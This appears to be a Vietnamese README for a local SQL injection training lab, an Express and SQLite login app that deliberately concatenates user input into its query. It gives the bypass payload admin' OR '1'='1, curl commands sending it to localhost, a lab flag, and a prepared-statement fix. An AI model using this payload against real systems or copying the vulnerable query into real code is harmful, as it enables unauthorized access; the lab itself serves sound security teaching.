# SQL Injection Lab

Lab thực hành SQL injection trong môi trường local. Ứng dụng mô phỏng một màn hình đăng nhập dùng Express và SQLite; endpoint `/login` cố ý ghép chuỗi đầu vào người dùng vào câu SQL để người học quan sát và khai thác lỗi.

> Chỉ chạy lab trên máy cá nhân hoặc mạng thử nghiệm được phép. Không triển khai ứng dụng này lên Internet và không dùng các kỹ thuật trong lab vào hệ thống không có sự cho phép.

## Mục tiêu

Sau khi hoàn thành, người học có thể:

- nhận biết điểm nhập liệu có nguy cơ SQL injection;
- phân biệt đăng nhập bình thường với đăng nhập bằng payload;
- hiểu tác động của việc ghép chuỗi trực tiếp vào câu truy vấn;
- giải thích vì sao prepared statement là cách khắc phục phù hợp.

## Yêu cầu

- Node.js 22.5 trở lên (khuyến nghị Node.js 24+ vì project dùng `node:sqlite`);
- npm;
- trình duyệt web.

Kiểm tra phiên bản:

```bash
node --version
npm --version
```

## Cài đặt và khởi động

Từ thư mục project:

```bash
npm install
npm start
```

Mở <http://127.0.0.1:3000>. Server chỉ lắng nghe trên loopback (`127.0.0.1`). Có thể đổi port bằng biến môi trường:

```bash
PORT=3001 npm start
```

Database SQLite nằm ở `database.db`. Nếu file chưa tồn tại, ứng dụng tự tạo bảng `users` và hai tài khoản mẫu:

| Username | Password | Role |
|---|---|---|
| `alice` | `alice123` | `user` |
| `admin` | `admin123` | `admin` |

## Bài lab

### 1. Đăng nhập bình thường

Đăng nhập bằng `alice` / `alice123`. Bạn sẽ được chuyển đến `/user` và chỉ có quyền user.

Đăng xuất rồi thử `admin` / `admin123` để thấy tài khoản admin hợp lệ. Trong bài thực tế, không nên dùng password lưu dạng plaintext như ví dụ này.

### 2. Quan sát câu SQL

Mỗi lần đăng nhập, terminal chạy server in ra câu query. Code dễ bị khai thác nằm trong `server.js`, tại endpoint `POST /login`:

```js
WHERE username = '${username}'
    AND password = '${password}'
```

Đầu vào được đưa thẳng vào SQL mà không dùng prepared statement.

### 3. Bypass kiểm tra password

Đăng xuất, sau đó nhập:

- Username: `admin' OR '1'='1`
- Password: `bất kỳ giá trị nào`

Payload này làm điều kiện trở thành dạng tương đương:

```sql
WHERE username = 'admin' OR '1'='1'
    AND password = 'bất kỳ giá trị nào'
```

Do thứ tự ưu tiên của `AND` và `OR`, dòng `admin` vẫn được trả về; ứng dụng lấy `role = admin` từ bản ghi đó và chuyển đến `/admin`.

Flag của lab nằm trên trang admin:

```text
FLAG{SQL_Injection_to_bypass}
```

### 4. Thực hiện bằng curl (tuỳ chọn)

```bash
curl -i -c /tmp/sql-lab.cookie \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin\u0027 OR \u00271\u0027=\u00271","password":"x"}' \
  http://127.0.0.1:3000/login

curl -b /tmp/sql-lab.cookie http://127.0.0.1:3000/admin
```

Response đăng nhập thành công phải có `"role":"admin"`.

## Reset lab

Server tự tạo lại database nếu `database.db` không tồn tại. Để reset các tài khoản đã thêm trong lúc thực hành, dừng server rồi xóa đúng file database:

```bash
rm database.db
npm start
```

## Khắc phục lỗ hổng

Trong ứng dụng thật, không ghép dữ liệu người dùng vào SQL. Thay phần query dễ lỗi bằng prepared statement:

```js
const user = db.prepare(`
    SELECT id, username, role
    FROM users
    WHERE username = ? AND password = ?
`).get(username, password);
```

Ngoài ra nên hash password bằng thư viện phù hợp (ví dụ Argon2 hoặc bcrypt), giới hạn log dữ liệu nhạy cảm, validate input, quản lý session an toàn và không để endpoint debug lộ câu SQL.

## Cấu trúc chính

```text
.
├── server.js          # Express server, SQLite, login và phân quyền
├── database.db        # SQLite database của lab
├── public/            # Trang login và CSS/JS
└── private/           # Trang user/admin, chỉ được gửi sau khi kiểm tra session
```

Đây là lab cố ý không an toàn; không xem các đoạn vulnerable trong `server.js` là mẫu code production.
